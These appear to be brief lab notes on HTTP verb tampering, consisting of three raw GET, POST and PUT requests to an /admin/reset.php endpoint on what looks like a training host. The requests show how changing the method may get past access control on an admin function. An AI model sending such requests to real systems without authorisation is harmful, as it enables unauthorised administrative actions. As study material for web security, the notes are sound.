# HTTP Verb Tampering

## GET

```http title="Request" hl_lines="1"
GET /admin/reset.php? HTTP/1.1
Host: 94.237.123.126:59614
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.123.126:59614/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

## POST

```http title="Request" hl_lines="1"
POST /admin/reset.php? HTTP/1.1
Host: 94.237.123.126:59614
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.123.126:59614/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

## PUT

```http title="Request" hl_lines="1"
PUT /admin/reset.php? HTTP/1.1
Host: 94.237.123.126:59614
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.123.126:59614/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
